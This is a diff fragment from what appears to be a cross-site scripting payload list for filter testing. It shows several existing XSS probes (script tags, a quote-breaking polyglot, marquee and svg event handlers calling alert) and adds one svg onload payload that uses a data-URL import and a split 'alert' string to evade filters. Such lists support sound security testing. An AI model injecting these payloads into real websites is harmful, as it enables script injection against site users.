@@ -1848,3 +1848,4 @@ foo<script>alert(1972)</script>
 ';alert(1974))//\';alert(1974))//";alert(1974))//\";alert(1974))//--></SCRIPT>">'><SCRIPT>alert(1974))</SCRIPT>
 <marquee onstart='javascript:alert(1975);'>=(◕_◕)=
 </span></span><svg onload="alert(1976)//“ #"="">
+<svg onload="import('data:text/javascript,al'+''+'ert(0)')">
